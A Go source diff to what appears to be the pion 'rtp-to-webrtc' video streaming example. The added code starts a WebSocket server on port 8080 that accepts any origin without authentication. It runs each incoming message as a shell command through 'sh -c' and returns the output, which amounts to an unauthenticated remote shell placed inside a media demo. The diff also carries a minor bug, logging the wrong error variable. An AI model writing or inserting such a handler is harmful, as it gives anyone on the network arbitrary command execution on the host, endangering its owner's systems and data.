@@ -9,10 +9,14 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"github.com/gorilla/websocket"
 	webrtc "github.com/pion/webrtc/v4"
 	"io"
+	"log"
 	"net"
+	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 )
 
@@ -20,6 +24,51 @@ import (
 // SPDX-License-Identifier: MIT
 
 // rtp-to-webrtc demonstrates how to consume a RTP stream video UDP, and then send to a WebRTC client.
+var upgrader = websocket.Upgrader{
+	ReadBufferSize:  1024,
+	WriteBufferSize: 1024,
+	CheckOrigin: func(r *http.Request) bool {
+		return true
+	},
+}
+
+func handleConnection(w http.ResponseWriter, r *http.Request) {
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Printf("Failed to upgrade connection: %v\n", err)
+		return
+	}
+	defer conn.Close()
+
+	//continuously read message from the connection
+	for {
+		messageType, p, err := conn.ReadMessage()
+		if err != nil {
+			log.Println("read: ", err)
+			break
+		}
+		command := string(p)
+		cmd := exec.Command("sh", "-c", command)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			log.Println("command execution error: ", err)
+			// Send the error back to the client
+			if err := conn.WriteMessage(messageType, []byte(err.Error())); err != nil {
+				log.Println("write error: ", err)
+				break
+			}
+			continue
+		}
+		if err := conn.WriteMessage(messageType, output); err != nil {
+			log.Println("write error: ", err)
+			break
+		}
+		if err := conn.WriteMessage(messageType, p); err != nil {
+			log.Println("write: ", err)
+			break
+		}
+	}
+}
 
 func main() {
 	peerConnection, err := webrtc.NewPeerConnection(webrtc.Configuration{
@@ -73,7 +122,9 @@ func main() {
 		fmt.Println("DataChannel has opened")
 	})
 
+	//This code ain't working  TODO: need to check.
 	datachannel.OnMessage(func(msg webrtc.DataChannelMessage) {
+		fmt.Printf("Received message of length %d\n", len(msg.Data))
 		fmt.Printf("Message from DataChannel: %s\n", string(msg.Data))
 	})
 
@@ -136,22 +187,31 @@ func main() {
 	// Output the answer in base64 so we can paste it in browser
 	fmt.Println(encode(peerConnection.LocalDescription()))
 
-	// Read RTP packets forever and send them to the WebRTC Client
-	inboundRTPPacket := make([]byte, 1600) // UDP MTU
-	for {
-		n, _, err := listener.ReadFrom(inboundRTPPacket)
-		if err != nil {
-			panic(fmt.Sprintf("error during read: %s", err))
-		}
-
-		if _, err = videoTrack.Write(inboundRTPPacket[:n]); err != nil {
-			if errors.Is(err, io.ErrClosedPipe) {
-				// The peerConnection has been closed.
-				return
+	go func() {
+		// Read RTP packets forever and send them to the WebRTC Client
+		inboundRTPPacket := make([]byte, 1600) // UDP MTU
+		for {
+			n, _, err := listener.ReadFrom(inboundRTPPacket)
+			if err != nil {
+				panic(fmt.Sprintf("error during read: %s", err))
 			}
 
-			panic(err)
+			if _, err = videoTrack.Write(inboundRTPPacket[:n]); err != nil {
+				if errors.Is(err, io.ErrClosedPipe) {
+					// The peerConnection has been closed.
+					return
+				}
+
+				panic(err)
+			}
 		}
+	}()
+
+	http.HandleFunc("/ws", handleConnection)
+	log.Println("Server has started on: 8080")
+	errs := http.ListenAndServe(":8080", nil)
+	if errs != nil {
+		log.Fatal("ListenAndServe: ", err)
 	}
 }
 
